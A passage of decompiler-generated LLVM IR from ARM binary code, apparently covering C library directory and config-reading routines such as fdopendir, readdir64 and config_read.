dec_label_pc_1abb8:                               ; preds = %dec_label_pc_1abb0
  store i32 %v2_1ab80, i32* @r1, align 4
  %v0_1abbc = call i32 @fstat()
  %v1_1abc0 = icmp slt i32 %v0_1abbc, 0
  br i1 %v1_1abc0, label %dec_label_pc_1abc8, label %dec_label_pc_1abdc

dec_label_pc_1abc8:                               ; preds = %dec_label_pc_1abb8
  br label %dec_label_pc_1abd4

dec_label_pc_1abd4:                               ; preds = %dec_label_pc_1abc8, %dec_label_pc_1abb0, %dec_label_pc_1ab98
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1ac20

dec_label_pc_1abdc:                               ; preds = %dec_label_pc_1abb8
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_1abe4 = load i32, i32* @r7, align 4
  %v3_1abe8 = call i32 @__GI___fcntl_nocancel(i32 %v0_1abe4, i32 2, i32 1)
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_1abf0 = load i32, i32* @r7, align 4
  %v2_1abf4 = call i32 @fd_to_DIR(i32 %v0_1abf0, i32 %tmp)
  store i32 %v2_1abf4, i32* %r1.global-to-local, align 4
  %v2_1abf8 = icmp eq i32 %v2_1abf4, 0
  br i1 %v2_1abf8, label %dec_label_pc_1ac00, label %dec_label_pc_1ac20

dec_label_pc_1ac00:                               ; preds = %dec_label_pc_1abdc
  %v0_1ac10 = call i32 @__aeabi_read_tp()
  %v3_1ac14 = load i16, i16* @global_var_32088.1320, align 2
  %v4_1ac14 = sext i16 %v3_1ac14 to i32
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_1ac1c = add i32 %v4_1ac14, %v0_1ac10
  %v4_1ac1c = inttoptr i32 %v3_1ac1c to i32*
  store i32 12, i32* %v4_1ac1c, align 4
  %v0_1ac20.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1ac20

dec_label_pc_1ac20:                               ; preds = %dec_label_pc_1abdc, %dec_label_pc_1abd4, %dec_label_pc_1ac00
  %v0_1ac20 = phi i32 [ %v2_1abf4, %dec_label_pc_1abdc ], [ 0, %dec_label_pc_1abd4 ], [ %v0_1ac20.pre, %dec_label_pc_1ac00 ]
  ret i32 %v0_1ac20

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_1ac20, { 2, 0, 1 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1ac30:
  %v0_1ac30 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1ac30, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1ac30
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1ac30, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @fdopendir(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_1ac40 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1ac40, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_1ac4c = call i32 @fstat()
  store i32 %v0_1ac4c, i32* @r5, align 4
  %v2_1ac50 = icmp eq i32 %v0_1ac4c, 0
  br i1 %v2_1ac50, label %dec_label_pc_1ac58, label %dec_label_pc_1acd0

dec_label_pc_1ac58:                               ; preds = %entry
  %v1_1ac5c = and i32 %tmp4, 61440
  store i32 %v1_1ac5c, i32* @r3, align 4
  %v7_1ac60 = icmp eq i32 %v1_1ac5c, 16384
  br i1 %v7_1ac60, label %dec_label_pc_1ac80, label %dec_label_pc_1ac68

dec_label_pc_1ac68:                               ; preds = %dec_label_pc_1ac58
  %v0_1ac6c = call i32 @__aeabi_read_tp()
  %v3_1ac70 = load i16, i16* @global_var_32088.1320, align 2
  %v0_1ac74 = load i32, i32* @r5, align 4
  store i32 %v0_1ac74, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1acb4

dec_label_pc_1ac80:                               ; preds = %dec_label_pc_1ac58
  %v0_1ac80 = load i32, i32* @r4, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_1ac88 = call i32 @__libc_fcntl(i32 %v0_1ac80, i32 3)
  %v7_1ac8c = icmp eq i32 %v2_1ac88, -1
  br i1 %v7_1ac8c, label %dec_label_pc_1acd0, label %dec_label_pc_1ac94

dec_label_pc_1ac94:                               ; preds = %dec_label_pc_1ac80
  %v1_1ac94 = urem i32 %v2_1ac88, 4
  store i32 %v1_1ac94, i32* %r3.global-to-local, align 4
  %v7_1ac98 = icmp eq i32 %v1_1ac94, 1
  br i1 %v7_1ac98, label %dec_label_pc_1aca0, label %dec_label_pc_1acbc

dec_label_pc_1aca0:                               ; preds = %dec_label_pc_1ac94
  %v0_1aca4 = call i32 @__aeabi_read_tp()
  %v3_1aca8 = load i16, i16* @global_var_32088.1320, align 2
  %v0_1acac = load i32, i32* @r5, align 4
  store i32 %v0_1acac, i32* %r1.global-to-local, align 4
  %v0_1acb0 = load i32, i32* %r3.global-to-local, align 4
  %v1_1acb0 = add i32 %v0_1acb0, 21
  br label %dec_label_pc_1acb4

dec_label_pc_1acb4:                               ; preds = %dec_label_pc_1ac68, %dec_label_pc_1aca0
  %v2_1acb4.in = phi i16 [ %v3_1ac70, %dec_label_pc_1ac68 ], [ %v3_1aca8, %dec_label_pc_1aca0 ]
  %v1_1acb4 = phi i32 [ %v0_1ac6c, %dec_label_pc_1ac68 ], [ %v0_1aca4, %dec_label_pc_1aca0 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_1ac68 ], [ %v1_1acb0, %dec_label_pc_1aca0 ]
  %v2_1acb4 = sext i16 %v2_1acb4.in to i32
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v3_1acb4 = add i32 %v1_1acb4, %v2_1acb4
  %v4_1acb4 = inttoptr i32 %v3_1acb4 to i32*
  store i32 %storemerge, i32* %v4_1acb4, align 4
  %v0_1acd4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1acd4

dec_label_pc_1acbc:                               ; preds = %dec_label_pc_1ac94
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_1acc0 = load i32, i32* @r4, align 4
  %v2_1acc4 = call i32 @fd_to_DIR(i32 %v0_1acc0, i32 %tmp)
  store i32 %v2_1acc4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1acd4

dec_label_pc_1acd0:                               ; preds = %entry, %dec_label_pc_1ac80
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1acd4

dec_label_pc_1acd4:                               ; preds = %dec_label_pc_1acbc, %dec_label_pc_1acb4, %dec_label_pc_1acd0
  %v0_1acd4 = phi i32 [ %v2_1acc4, %dec_label_pc_1acbc ], [ %v0_1acd4.pre, %dec_label_pc_1acb4 ], [ 0, %dec_label_pc_1acd0 ]
  ret i32 %v0_1acd4

; uselistorder directives
  uselistorder i32 %v1_1ac94, { 1, 0 }
  uselistorder i32 %v2_1ac88, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 6, 4, 5, 7, 0 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder i32 21, { 1, 0, 3, 2 }
  uselistorder i32 ()* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_1acd4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1acd0, { 1, 0 }
  uselistorder label %dec_label_pc_1acb4, { 1, 0 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @r6, align 4
  %v1_1ad00 = add i32 %tmp, 24
  store i32 %v1_1ad00, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_1ad18 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 124) to i32*), align 4
  store i32 %v4_1ad18, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1ad18)
  %v0_1ad2c = load i32, i32* @r6, align 4
  %v2_1ad2c = add i32 %v0_1ad2c, 20
  %v3_1ad2c = inttoptr i32 %v2_1ad2c to i32*
  %v4_1ad2c = load i32, i32* %v3_1ad2c, align 4
  store i32 %v4_1ad2c, i32* %ip.global-to-local, align 4
  store i32 109880, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1ad2c)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_1ad3c

dec_label_pc_1ad3c:                               ; preds = %dec_label_pc_1ad6c, %entry
  %v0_1ad3c = load i32, i32* @r5, align 4
  %v1_1ad3c = add i32 %v0_1ad3c, 4
  %v2_1ad3c = inttoptr i32 %v1_1ad3c to i32*
  %v3_1ad3c = load i32, i32* %v2_1ad3c, align 4
  %v4_1ad3c = add i32 %v0_1ad3c, 8
  %v5_1ad3c = inttoptr i32 %v4_1ad3c to i32*
  %v6_1ad3c = load i32, i32* %v5_1ad3c, align 4
  %tmp10 = icmp ugt i32 %v6_1ad3c, %v3_1ad3c
  br i1 %tmp10, label %dec_label_pc_1ad6c, label %dec_label_pc_1ad48

dec_label_pc_1ad48:                               ; preds = %dec_label_pc_1ad3c
  %v1_1ad48 = inttoptr i32 %v0_1ad3c to i32*
  %v2_1ad48 = load i32, i32* %v1_1ad48, align 4
  %v1_1ad4c = add i32 %v0_1ad3c, 12
  %v2_1ad4c = inttoptr i32 %v1_1ad4c to i32*
  %v3_1ad4c = load i32, i32* %v2_1ad4c, align 4
  %v1_1ad50 = add i32 %v0_1ad3c, 20
  %v2_1ad50 = inttoptr i32 %v1_1ad50 to i32*
  %v3_1ad50 = load i32, i32* %v2_1ad50, align 4
  %v4_1ad54 = inttoptr i32 %v3_1ad4c to i32*
  %v5_1ad54 = call i32 @__getdents64(i32 %v2_1ad48, i32* %v4_1ad54, i32 %v3_1ad50, i32 %v6_1ad3c)
  %tmp9 = icmp slt i32 %v5_1ad54, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_1ad64

.thread:                                          ; preds = %dec_label_pc_1ad48
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1ad9c

dec_label_pc_1ad64:                               ; preds = %dec_label_pc_1ad48
  %v1_1ad64 = load i32, i32* @r5, align 4
  %v2_1ad64 = add i32 %v1_1ad64, 8
  %v3_1ad64 = inttoptr i32 %v2_1ad64 to i32*
  store i32 %v5_1ad54, i32* %v3_1ad64, align 4
  %v0_1ad68 = load i32, i32* @r7, align 4
  %v1_1ad68 = load i32, i32* @r5, align 4
  %v2_1ad68 = add i32 %v1_1ad68, 4
  %v3_1ad68 = inttoptr i32 %v2_1ad68 to i32*
  store i32 %v0_1ad68, i32* %v3_1ad68, align 4
  %v0_1ad6c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1ad6c

dec_label_pc_1ad6c:                               ; preds = %dec_label_pc_1ad3c, %dec_label_pc_1ad64
  %v1_1ad90 = phi i32 [ %v0_1ad3c, %dec_label_pc_1ad3c ], [ %v0_1ad6c.pre, %dec_label_pc_1ad64 ]
  %v1_1ad6c = add i32 %v1_1ad90, 4
  %v2_1ad6c = inttoptr i32 %v1_1ad6c to i32*
  %v3_1ad6c = load i32, i32* %v2_1ad6c, align 4
  %v1_1ad70 = add i32 %v1_1ad90, 12
  %v2_1ad70 = inttoptr i32 %v1_1ad70 to i32*
  %v3_1ad70 = load i32, i32* %v2_1ad70, align 4
  %v2_1ad74 = add i32 %v3_1ad70, %v3_1ad6c
  store i32 %v2_1ad74, i32* @r4, align 4
  %v3_1ad78 = inttoptr i32 %v2_1ad74 to i32*
  %v4_1ad78 = load i32, i32* %v3_1ad78, align 4
  %v1_1ad7c = add i32 %v2_1ad74, 4
  %v2_1ad7c = inttoptr i32 %v1_1ad7c to i32*
  %v3_1ad7c = load i32, i32* %v2_1ad7c, align 4
  %v1_1ad80 = add i32 %v2_1ad74, 16
  %v2_1ad80 = inttoptr i32 %v1_1ad80 to i16*
  %v3_1ad80 = load i16, i16* %v2_1ad80, align 2
  %v4_1ad80 = zext i16 %v3_1ad80 to i32
  %v1_1ad84 = add i32 %v2_1ad74, 8
  %v2_1ad84 = inttoptr i32 %v1_1ad84 to i32*
  %v3_1ad84 = load i32, i32* %v2_1ad84, align 4
  store i32 %v3_1ad84, i32* %ip.global-to-local, align 4
  %v2_1ad88 = add i32 %v4_1ad80, %v3_1ad6c
  %v2_1ad8c = or i32 %v3_1ad7c, %v4_1ad78
  %v4_1ad8c = icmp eq i32 %v2_1ad8c, 0
  store i32 %v2_1ad88, i32* %v2_1ad6c, align 4
  %v0_1ad94 = load i32, i32* %ip.global-to-local, align 4
  %v1_1ad94 = load i32, i32* @r5, align 4
  %v2_1ad94 = add i32 %v1_1ad94, 16
  %v3_1ad94 = inttoptr i32 %v2_1ad94 to i32*
  store i32 %v0_1ad94, i32* %v3_1ad94, align 4
  br i1 %v4_1ad8c, label %dec_label_pc_1ad3c, label %dec_label_pc_1ad9c

dec_label_pc_1ad9c:                               ; preds = %dec_label_pc_1ad6c, %.thread
  %v0_1ada8 = load i32, i32* @r6, align 4
  %v2_1ada8 = add i32 %v0_1ada8, 52
  %v3_1ada8 = inttoptr i32 %v2_1ada8 to i32*
  %v4_1ada8 = load i32, i32* %v3_1ada8, align 4
  store i32 %v4_1ada8, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1ada8)
  %v0_1adb4 = load i32, i32* @r4, align 4
  ret i32 %v0_1adb4

; uselistorder directives
  uselistorder i32 %v2_1ad74, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_1ad90, { 1, 0 }
  uselistorder i32 %v6_1ad3c, { 1, 0 }
  uselistorder i32 %v0_1ad3c, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_1ad6c, { 1, 0 }
}

define i32 @function_1adc8(i32 %arg1) local_unnamed_addr {
dec_label_pc_1adc8:
  %v0_1adc8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1adc8, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1adc8
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1adc8, %bb
  %v10_1add4 = phi i32 [ %arg1, %dec_label_pc_1adc8 ], [ 0, %bb ]
  ret i32 %v10_1add4

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_1add8 = load i32, i32* @r4, align 4
  %v6_1add8 = load i32, i32* @r5, align 4
  %v9_1add8 = load i32, i32* @r6, align 4
  %v12_1add8 = load i32, i32* @r7, align 4
  %v15_1add8 = load i32, i32* @r8, align 4
  %v18_1add8 = load i32, i32* @sb, align 4
  %v21_1add8 = load i32, i32* @sl, align 4
  %v24_1add8 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_1addc = icmp eq i32* %arg1, null
  store i1 %v2_1addc, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_1addc, label %dec_label_pc_1b0ec, label %dec_label_pc_1adf4

dec_label_pc_1adf4:                               ; preds = %entry
  %v1_1adf4 = urem i32 %arg3, 256
  store i32 %v1_1adf4, i32* @sb, align 4
  %v1_1adf8 = udiv i32 %arg3, 256
  %v3_1adfc = urem i32 %v1_1adf8, 256
  %v3_1ae00 = mul nuw nsw i32 %v1_1adf4, 4
  %v1_1ae08 = or i32 %v3_1ae00, 1
  %v1_1ae14 = and i32 %arg3, 131072
  %v1_1ae18 = add nsw i32 %v1_1adf4, -1
  %v1_1ae24 = and i32 %arg3, 262144
  store i32 %v1_1ae24, i32* %r2.global-to-local, align 4
  %v1_1ae28 = and i32 %arg3, 65536
  store i32 %v1_1ae28, i32* %r3.global-to-local, align 4
  store i32 %v1_1ae28, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_1ae38 = add i32 %arg4, 1
  store i32 %v1_1ae38, i32* @sl, align 4
  %v2_1afb0 = icmp eq i32 %v1_1ae14, 0
  %v1_1b008 = inttoptr i32 %arg2 to i32*
  %v2_1b020 = icmp eq i32 %v1_1ae24, 0
  br label %dec_label_pc_1ae3c

dec_label_pc_1ae3c:                               ; preds = %dec_label_pc_1ae3c.backedge, %dec_label_pc_1adf4
  %v2_1ae58 = phi i32 [ %v0_1ae3c.pre, %dec_label_pc_1ae3c.backedge ], [ %tmp, %dec_label_pc_1adf4 ]
  %v1_1ae3c = add i32 %v2_1ae58, 4
  %v2_1ae3c = inttoptr i32 %v1_1ae3c to i32*
  %v3_1ae3c = load i32, i32* %v2_1ae3c, align 4
  store i32 %v3_1ae3c, i32* %r3.global-to-local, align 4
  %v2_1ae40 = icmp eq i32 %v3_1ae3c, 0
  store i1 %v2_1ae40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ae40, label %dec_label_pc_1ae48, label %dec_label_pc_1ae90

dec_label_pc_1ae48:                               ; preds = %dec_label_pc_1ae3c
  %v1_1ae48 = add i32 %v2_1ae58, 16
  %v2_1ae48 = inttoptr i32 %v1_1ae48 to i32*
  %v3_1ae48 = load i32, i32* %v2_1ae48, align 4
  store i32 %v3_1ae48, i32* %r3.global-to-local, align 4
  %v2_1ae4c = icmp eq i32 %v3_1ae48, 0
  store i1 %v2_1ae4c, i1* %cpsr_z.global-to-local, align 1
  %v1_1ae50 = add i32 %v2_1ae58, 8
  %v2_1ae50 = inttoptr i32 %v1_1ae50 to i32*
  %v3_1ae50 = load i32, i32* %v2_1ae50, align 4
  store i32 %v3_1ae50, i32* %r3.global-to-local, align 4
  br i1 %v2_1ae4c, label %bb, label %bb64

bb:                                               ; preds = %dec_label_pc_1ae48
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_1ae48, align 4
  %v0_1ae5c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_1ae48, %bb
  %v0_1ae5c = phi i32 [ %v0_1ae5c.pre, %bb ], [ %v3_1ae50, %dec_label_pc_1ae48 ]
  %v2_1ae5c = icmp eq i32 %v0_1ae5c, 0
  store i1 %v2_1ae5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ae5c, label %bb65, label %.thread

bb65:                                             ; preds = %bb64
  store i32 %v1_1ae08, i32* %r3.global-to-local, align 4
  %v2_1ae64 = load i32, i32* @r5, align 4
  %v3_1ae64 = add i32 %v2_1ae64, 8
  %v4_1ae64 = inttoptr i32 %v3_1ae64 to i32*
  store i32 %v1_1ae08, i32* %v4_1ae64, align 4
  br label %.thread

.thread:                                          ; preds = %bb64, %bb65
  %v0_1ae68 = load i32, i32* @r5, align 4
  %v1_1ae68 = add i32 %v0_1ae68, 16
  %v2_1ae68 = inttoptr i32 %v1_1ae68 to i32*
  %v3_1ae68 = load i32, i32* %v2_1ae68, align 4
  store i32 %v3_1ae68, i32* %r0.global-to-local, align 4
  %v1_1ae6c = add i32 %v0_1ae68, 8
  %v2_1ae6c = inttoptr i32 %v1_1ae6c to i32*
  %v3_1ae6c = load i32, i32* %v2_1ae6c, align 4
  store i32 %v3_1ae6c, i32* %r3.global-to-local, align 4
  %v2_1ae70 = add i32 %v3_1ae6c, %v3_1ae68
  store i32 %v2_1ae70, i32* %r0.global-to-local, align 4
  %v1_1ae74 = call i32 @malloc(i32 %v2_1ae70)
  store i32 %v1_1ae74, i32* %r0.global-to-local, align 4
  %v2_1ae78 = icmp eq i32 %v1_1ae74, 0
  store i1 %v2_1ae78, i1* %cpsr_z.global-to-local, align 1
  %v1_1ae7c = load i32, i32* @r5, align 4
  %v2_1ae7c = add i32 %v1_1ae7c, 4
  %v3_1ae7c = inttoptr i32 %v2_1ae7c to i32*
  store i32 %v1_1ae74, i32* %v3_1ae7c, align 4
  br i1 %v2_1ae78, label %dec_label_pc_1b0ec, label %dec_label_pc_1ae84

dec_label_pc_1ae84:                               ; preds = %.thread
  %v0_1ae84 = load i32, i32* @r5, align 4
  %v1_1ae84 = add i32 %v0_1ae84, 20
  %v2_1ae84 = inttoptr i32 %v1_1ae84 to i32*
  %v3_1ae84 = load i32, i32* %v2_1ae84, align 4
  %v1_1ae88 = or i32 %v3_1ae84, 1
  store i32 %v1_1ae88, i32* %r3.global-to-local, align 4
  store i32 %v1_1ae88, i32* %v2_1ae84, align 4
  %v0_1ae90.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1ae90

dec_label_pc_1ae90:                               ; preds = %dec_label_pc_1ae3c, %dec_label_pc_1ae84
  %v1_1ae98 = phi i32 [ %v2_1ae58, %dec_label_pc_1ae3c ], [ %v0_1ae90.pre, %dec_label_pc_1ae84 ]
  %v1_1ae90 = add i32 %v1_1ae98, 4
  %v2_1ae90 = inttoptr i32 %v1_1ae90 to i32*
  %v3_1ae90 = load i32, i32* %v2_1ae90, align 4
  store i32 %v3_1ae90, i32* %r2.global-to-local, align 4
  %v4_1ae90 = add i32 %v1_1ae98, 8
  %v5_1ae90 = inttoptr i32 %v4_1ae90 to i32*
  %v6_1ae90 = load i32, i32* %v5_1ae90, align 4
  %v2_1ae94 = add i32 %v6_1ae90, %v3_1ae90
  store i32 %v2_1ae94, i32* %r3.global-to-local, align 4
  %v2_1ae98 = add i32 %v1_1ae98, 12
  %v3_1ae98 = inttoptr i32 %v2_1ae98 to i32*
  store i32 %v2_1ae94, i32* %v3_1ae98, align 4
  %v0_1ae9c = load i32, i32* @fp, align 4
  store i32 %v0_1ae9c, i32* @r6, align 4
  br label %dec_label_pc_1aea0

dec_label_pc_1aea0:                               ; preds = %dec_label_pc_1af2c, %dec_label_pc_1af18, %dec_label_pc_1ae90
  %v0_1aea8 = phi i32 [ %v0_1ae9c, %dec_label_pc_1ae90 ], [ %v1_1af18, %dec_label_pc_1af18 ], [ %v0_1aea8.pre.pre, %dec_label_pc_1af2c ]
  %v0_1aea0 = load i32, i32* @r5, align 4
  %v1_1aea0 = add i32 %v0_1aea0, 12
  store i32 %v1_1aea0, i32* %r0.global-to-local, align 4
  %v1_1aea4 = inttoptr i32 %v1_1aea0 to i32*
  %v2_1aea4 = load i32, i32* %v1_1aea4, align 4
  store i32 %v2_1aea4, i32* %r0.global-to-local, align 4
  %v3_1aea4 = add i32 %v0_1aea0, 16
  %v4_1aea4 = inttoptr i32 %v3_1aea4 to i32*
  %v5_1aea4 = load i32, i32* %v4_1aea4, align 4
  %v2_1aea8 = add i32 %v2_1aea4, %v0_1aea8
  store i32 %v2_1aea8, i32* %r0.global-to-local, align 4
  %v2_1aeac = sub i32 %v5_1aea4, %v0_1aea8
  %v1_1aeb0 = inttoptr i32 %v0_1aea0 to i32*
  %v2_1aeb0 = load i32, i32* %v1_1aeb0, align 4
  store i32 %v2_1aeb0, i32* %r2.global-to-local, align 4
  %v3_1aeb4 = call i32 @fgets(i32 %v2_1aea8, i32 %v2_1aeac, i32 %v2_1aeb0)
  store i32 %v3_1aeb4, i32* %r0.global-to-local, align 4
  store i32 %v3_1aeb4, i32* %r4.global-to-local, align 4
  %v2_1aeb8 = icmp eq i32 %v3_1aeb4, 0
  store i1 %v2_1aeb8, i1* %cpsr_z.global-to-local, align 1
  %v0_1aec0 = load i32, i32* @r5, align 4
  %v1_1aec0 = add i32 %v0_1aec0, 12
  br i1 %v2_1aeb8, label %dec_label_pc_1aec0, label %dec_label_pc_1aed8

dec_label_pc_1aec0:                               ; preds = %dec_label_pc_1aea0
  store i32 %v1_1aec0, i32* %r0.global-to-local, align 4
  %v1_1aec4 = inttoptr i32 %v1_1aec0 to i32*
  %v2_1aec4 = load i32, i32* %v1_1aec4, align 4
  store i32 %v2_1aec4, i32* %r0.global-to-local, align 4
  %v3_1aec4 = add i32 %v0_1aec0, 16
  %v4_1aec4 = inttoptr i32 %v3_1aec4 to i32*
  %v5_1aec4 = load i32, i32* %v4_1aec4, align 4
  store i32 %v5_1aec4, i32* %r2.global-to-local, align 4
  %v3_1aecc = inttoptr i32 %v2_1aec4 to i8*
  %v4_1aecc = call i32 @__GI_memset(i8* %v3_1aecc, i32 0, i32 %v5_1aec4)
  store i32 %v4_1aecc, i32* %r0.global-to-local, align 4
  %v0_1aed0 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1b0f0

dec_label_pc_1aed8:                               ; preds = %dec_label_pc_1aea0
  %v2_1aed8 = inttoptr i32 %v1_1aec0 to i32*
  %v3_1aed8 = load i32, i32* %v2_1aed8, align 4
  store i32 %v3_1aed8, i32* @r4, align 4
  %v1_1aedc = load i32, i32* @r6, align 4
  %v2_1aedc = add i32 %v1_1aedc, %v3_1aed8
  %v3_1aedc = inttoptr i32 %v2_1aedc to i8*
  store i32 %v2_1aedc, i32* %r0.global-to-local, align 4
  %v3_1aee0 = call i32 @strlen(i8* %v3_1aedc)
  %v0_1aee8 = load i32, i32* @r6, align 4
  %v2_1aee8 = add i32 %v0_1aee8, %v3_1aee0
  store i32 %v2_1aee8, i32* @r6, align 4
  %v0_1aeec = load i32, i32* @r4, align 4
  store i32 %v0_1aeec, i32* @r0, align 4
  %v2_1aef0 = call i32 @__GI_strchr(i32 %v0_1aeec, i32 10)
  store i32 %v2_1aef0, i32* %r0.global-to-local, align 4
  %v2_1aef4 = icmp eq i32 %v2_1aef0, 0
  store i1 %v2_1aef4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1aef4, label %dec_label_pc_1af20, label %dec_label_pc_1aefc

dec_label_pc_1aefc:                               ; preds = %dec_label_pc_1aed8
  %v1_1aefc = inttoptr i32 %v2_1aef0 to i8*
  %v2_1aefc = load i8, i8* %v1_1aefc, align 1
  %v3_1aefc = zext i8 %v2_1aefc to i32
  %v1_1af00 = add nuw nsw i32 %v3_1aefc, 255
  %v1_1af04 = urem i32 %v1_1af00, 256
  store i32 %v1_1af04, i32* %r3.global-to-local, align 4
  %v7_1af08 = icmp eq i32 %v1_1af04, 92
  store i1 %v7_1af08, i1* %cpsr_z.global-to-local, align 1
  %v1_1af0c = trunc i32 %v1_1af00 to i8
  store i8 %v1_1af0c, i8* %v1_1aefc, align 1
  %v0_1af10 = load i32, i32* @r6, align 4
  %v1_1af10 = add i32 %v0_1af10, -1
  store i32 %v1_1af10, i32* @r6, align 4
  %v0_1af14 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1af14, label %dec_label_pc_1af18, label %dec_label_pc_1afa4

dec_label_pc_1af18:                               ; preds = %dec_label_pc_1aefc
  %v1_1af18 = add i32 %v0_1af10, -2
  store i32 %v1_1af18, i32* @r6, align 4
  br label %dec_label_pc_1aea0

dec_label_pc_1af20:                               ; preds = %dec_label_pc_1aed8
  %v0_1af20 = load i32, i32* @r5, align 4
  %v1_1af20 = add i32 %v0_1af20, 20
  %v2_1af20 = inttoptr i32 %v1_1af20 to i32*
  %v3_1af20 = load i32, i32* %v2_1af20, align 4
  store i32 %v3_1af20, i32* %r3.global-to-local, align 4
  %v2_1af24 = icmp eq i32 %v3_1af20, 0
  store i1 %v2_1af24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1af24, label %dec_label_pc_1af5c, label %dec_label_pc_1af2c

dec_label_pc_1af2c:                               ; preds = %dec_label_pc_1af20
  %v1_1af2c = add i32 %v0_1af20, 16
  %v2_1af2c = inttoptr i32 %v1_1af2c to i32*
  %v3_1af2c = load i32, i32* %v2_1af2c, align 4
  store i32 %v3_1af2c, i32* %r3.global-to-local, align 4
  %v1_1af30 = add i32 %v0_1af20, 8
  %v2_1af30 = inttoptr i32 %v1_1af30 to i32*
  %v3_1af30 = load i32, i32* %v2_1af30, align 4
  %v1_1af34 = add i32 %v3_1af2c, 4096
  store i32 %v1_1af34, i32* %r3.global-to-local, align 4
  %v2_1af38 = add i32 %v3_1af30, %v1_1af34
  store i32 %v1_1af34, i32* %v2_1af2c, align 4
  %v0_1af40 = load i32, i32* @r5, align 4
  %v1_1af40 = add i32 %v0_1af40, 4
  %v2_1af40 = inttoptr i32 %v1_1af40 to i32*
  %v3_1af40 = load i32, i32* %v2_1af40, align 4
  store i32 %v3_1af40, i32* %r0.global-to-local, align 4
  %v2_1af44 = inttoptr i32 %v3_1af40 to i32*
  %v3_1af44 = call i32 @realloc(i32* %v2_1af44, i32 %v2_1af38)
  store i32 %v3_1af44, i32* %r0.global-to-local, align 4
  %v0_1af48 = load i32, i32* @r5, align 4
  %v1_1af48 = add i32 %v0_1af48, 8
  %v2_1af48 = inttoptr i32 %v1_1af48 to i32*
